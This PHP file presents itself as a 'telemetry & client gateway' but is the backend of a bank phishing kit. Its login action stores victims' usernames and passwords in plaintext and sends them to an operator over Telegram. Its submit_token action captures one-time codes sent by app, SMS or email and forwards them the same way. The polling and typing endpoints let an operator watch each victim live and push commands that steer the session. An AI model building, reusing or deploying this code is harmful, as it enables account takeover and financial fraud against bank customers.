<?php
/**
 * ECO //- FRONTEND TELEMETRY & CLIENT GATEWAY
 */

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

require_once __DIR__ . '/config.php';

function jsonApiResponse(array $data, int $httpCode = 200): void {
    http_response_code($httpCode);
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

// 1. Blacklist Check
if (isIpBlacklisted($db, $user_ip)) {
    jsonApiResponse(['status' => 'BAN', 'message' => 'Acceso denegado'], 403);
}

$action = clean($_POST['action'] ?? $_GET['action'] ?? '');
$now = time();

// --- ACTION: LOGIN (CREDENCIALES PERSONAS / EMPRESAS) ---
if ($action === 'login') {
    $user = clean($_POST['user'] ?? '');
    $pass = clean($_POST['pass'] ?? '');
    $segment = clean($_POST['segment'] ?? 'personas');
    $device = getDevice();

    if (empty($user) || empty($pass)) {
        jsonApiResponse(['status' => 'error', 'message' => 'Credenciales incompletas'], 400);
    }

    $formattedUser = ($segment === 'empresas') ? "[EMP] " . $user : $user;

    // Insert new client session into database
    $stmt = $db->prepare("
        INSERT INTO clients (ip, user, pass, token, status, last_updated, created_at, is_typing, device, token_changed, identity_clicked)
        VALUES (:ip, :user, :pass, '', 'WAITING', :now, :now, 0, :device, 0, 0)
    ");
    $stmt->bindValue(':ip', $user_ip, SQLITE3_TEXT);
    $stmt->bindValue(':user', $formattedUser, SQLITE3_TEXT);
    $stmt->bindValue(':pass', $pass, SQLITE3_TEXT);
    $stmt->bindValue(':now', $now, SQLITE3_INTEGER);
    $stmt->bindValue(':device', $device, SQLITE3_TEXT);
    $stmt->execute();

    $clientId = (int)$db->lastInsertRowID();
    $_SESSION['conti_client_id'] = $clientId;

    // Cache country code
    resolveCountryCode($db, $user_ip);

    // Audit log
    $logStmt = $db->prepare("INSERT INTO system_logs (operator_name, event_type, description, timestamp) VALUES ('SYSTEM', 'LOGIN_CLIENT', :desc, :now)");
    $logStmt->bindValue(':desc', "Nuevo ingreso cliente #{$clientId} [{$segment}] desde {$user_ip}", SQLITE3_TEXT);
    $logStmt->bindValue(':now', $now, SQLITE3_INTEGER);
    $logStmt->execute();

    // Telegram Alert
    $telegramMsg = "🏦 <b>PANEL ADMIN // NUEVO INGRESO</b>\n\n"
                 . "🆔 <b>Cliente:</b> <code>#{$clientId}</code>\n"
                 . "👤 <b>Usuario / Doc:</b> <code>{$formattedUser}</code>\n"
                 . "🔑 <b>Contraseña:</b> <code>{$pass}</code>\n"
                 . "📁 <b>Segmento:</b> " . strtoupper($segment) . "\n"
                 . "🌐 <b>IP:</b> <code>{$user_ip}</code>\n"
                 . "📱 <b>Dispositivo:</b> {$device}";
    sendTelegram($telegramMsg, 'HTML');

    jsonApiResponse([
        'status' => 'success',
        'client_id' => $clientId,
        'command' => 'WAITING'
    ]);
}

// --- ACTION: SUBMIT TOKEN OTP ---
if ($action === 'submit_token') {
    $clientId = isset($_POST['client_id']) && (int)$_POST['client_id'] > 0 ? (int)$_POST['client_id'] : ($_SESSION['conti_client_id'] ?? 0);
    if ($clientId <= 0) {
        $stmtFind = $db->prepare("SELECT id FROM clients WHERE ip = :ip ORDER BY id DESC LIMIT 1");
        $stmtFind->bindValue(':ip', $user_ip, SQLITE3_TEXT);
        $resFind = $stmtFind->execute();
        if ($rowFind = $resFind->fetchArray(SQLITE3_ASSOC)) {
            $clientId = (int)$rowFind['id'];
            $_SESSION['conti_client_id'] = $clientId;
        }
    }
    $token = clean($_POST['token'] ?? '');
    $tokenType = clean($_POST['token_type'] ?? 'CONTI'); // CONTI, SMS, CORREO

    if ($clientId <= 0 || empty($token)) {
        jsonApiResponse(['status' => 'error', 'message' => 'Datos de token inválidos'], 400);
    }

    $formattedToken = "[{$tokenType}] " . $token;

    $stmt = $db->prepare("
        UPDATE clients 
        SET token = :token, token_changed = 1, status = 'WAITING', last_updated = :now, is_typing = 0 
        WHERE id = :id
    ");
    $stmt->bindValue(':token', $formattedToken, SQLITE3_TEXT);
    $stmt->bindValue(':now', $now, SQLITE3_INTEGER);
    $stmt->bindValue(':id', $clientId, SQLITE3_INTEGER);
    $stmt->execute();

    // Audit log
    $logStmt = $db->prepare("INSERT INTO system_logs (operator_name, event_type, description, timestamp) VALUES ('SYSTEM', 'TOKEN_CLIENT', :desc, :now)");
    $logStmt->bindValue(':desc', "Cliente #{$clientId} envió token {$tokenType}: {$token}", SQLITE3_TEXT);
    $logStmt->bindValue(':now', $now, SQLITE3_INTEGER);
    $logStmt->execute();

    // Telegram Alert
    $telegramMsg = "⚡ <b>PANEL ADMIN // TOKEN RECIBIDO</b>\n\n"
                 . "🆔 <b>Cliente:</b> <code>#{$clientId}</code>\n"
                 . "🎫 <b>Tipo de Token:</b> {$tokenType}\n"
                 . "🔢 <b>Código OTP:</b> <code>{$token}</code>\n"
                 . "🌐 <b>IP:</b> <code>{$user_ip}</code>";
    sendTelegram($telegramMsg, 'HTML');

    jsonApiResponse([
        'status' => 'success',
        'message' => 'Token recibido',
        'command' => 'WAITING'
    ]);
}

// --- ACTION: CHECK STATUS (POLLING & TELEMETRY HEARTBEAT) ---
if ($action === 'check_status') {
    $clientId = isset($_POST['client_id']) && (int)$_POST['client_id'] > 0 ? (int)$_POST['client_id'] : ($_SESSION['conti_client_id'] ?? 0);
    if ($clientId <= 0) {
        $stmtFind = $db->prepare("SELECT id FROM clients WHERE ip = :ip ORDER BY id DESC LIMIT 1");
        $stmtFind->bindValue(':ip', $user_ip, SQLITE3_TEXT);
        $resFind = $stmtFind->execute();
        if ($rowFind = $resFind->fetchArray(SQLITE3_ASSOC)) {
            $clientId = (int)$rowFind['id'];
            $_SESSION['conti_client_id'] = $clientId;
        }
    }
    $isTyping = isset($_POST['is_typing']) ? (int)$_POST['is_typing'] : 0;

    if ($clientId <= 0) {
        jsonApiResponse(['status' => 'error', 'message' => 'Sesión no iniciada'], 400);
    }

    // Keepalive update
    $upStmt = $db->prepare("UPDATE clients SET last_updated = :now, is_typing = :typing WHERE id = :id");
    $upStmt->bindValue(':now', $now, SQLITE3_INTEGER);
    $upStmt->bindValue(':typing', $isTyping, SQLITE3_INTEGER);
    $upStmt->bindValue(':id', $clientId, SQLITE3_INTEGER);
    $upStmt->execute();

    // Retrieve active status
    $stmt = $db->prepare("SELECT status FROM clients WHERE id = :id LIMIT 1");
    $stmt->bindValue(':id', $clientId, SQLITE3_INTEGER);
    $res = $stmt->execute();
    $row = $res->fetchArray(SQLITE3_ASSOC);

    if (!$row) {
        jsonApiResponse(['status' => 'error', 'command' => 'LOGIN'], 404);
    }

    jsonApiResponse([
        'status' => 'success',
        'command' => (string)$row['status']
    ]);
}

// --- ACTION: TYPING HEARTBEAT ---
if ($action === 'typing') {
    $clientId = isset($_POST['client_id']) ? (int)$_POST['client_id'] : ($_SESSION['conti_client_id'] ?? 0);
    $typing = (int)($_POST['typing'] ?? 0);

    if ($clientId > 0) {
        $stmt = $db->prepare("UPDATE clients SET is_typing = :typing, last_updated = :now WHERE id = :id");
        $stmt->bindValue(':typing', $typing, SQLITE3_INTEGER);
        $stmt->bindValue(':now', $now, SQLITE3_INTEGER);
        $stmt->bindValue(':id', $clientId, SQLITE3_INTEGER);
        $stmt->execute();
    }

    jsonApiResponse(['status' => 'success']);
}

// --- ACTION: IDENTITY CLICKED (Telemetría de interacción con token) ---
if ($action === 'identity_clicked') {
    $clientId = isset($_POST['client_id']) ? (int)$_POST['client_id'] : ($_SESSION['conti_client_id'] ?? 0);

    if ($clientId > 0) {
        $stmt = $db->prepare("UPDATE clients SET identity_clicked = identity_clicked + 1, last_updated = :now WHERE id = :id");
        $stmt->bindValue(':now', $now, SQLITE3_INTEGER);
        $stmt->bindValue(':id', $clientId, SQLITE3_INTEGER);
        $stmt->execute();
    }

    jsonApiResponse(['status' => 'success']);
}

jsonApiResponse(['status' => 'error', 'message' => 'Acción no válida'], 400);
